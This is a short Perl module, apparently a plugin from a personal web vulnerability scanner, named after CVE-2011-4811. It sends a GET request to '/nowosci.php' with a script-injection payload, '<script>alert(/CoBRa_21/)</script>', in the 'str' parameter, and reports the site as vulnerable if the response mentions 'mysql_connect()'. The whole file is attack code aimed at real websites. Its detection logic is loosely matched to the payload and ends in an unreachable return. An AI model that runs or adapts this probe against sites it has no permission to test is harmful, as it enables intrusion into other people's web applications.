package Exploit::CVE_2011_4811;

require Exporter;
our @ISA = qw( Exporter );
our @EXPORT = qw( run );

use Mojo;
use WEB; # вот это мой модуль

sub run($) {
	my $url = shift->clone;
	$url->path('/nowosci.php');
	my $tx = WEB::request(
		method => 'GET',
		url => $url,
		get_params => {
			'a'=>"1",
			'str'=>"<script>alert(/CoBRa_21/)</script>"
		}
	);
	
	#print $tx->req->to_string;
	
	my $body = $tx->res->body;
	return 0 if (($body =~ /HTTP Error 404.0 - Not Found/)||($body =~ /Error 404.0/)||($body =~ /Not Found/));
	return $body =~ /mysql_connect()/;
	return 1;
}

1;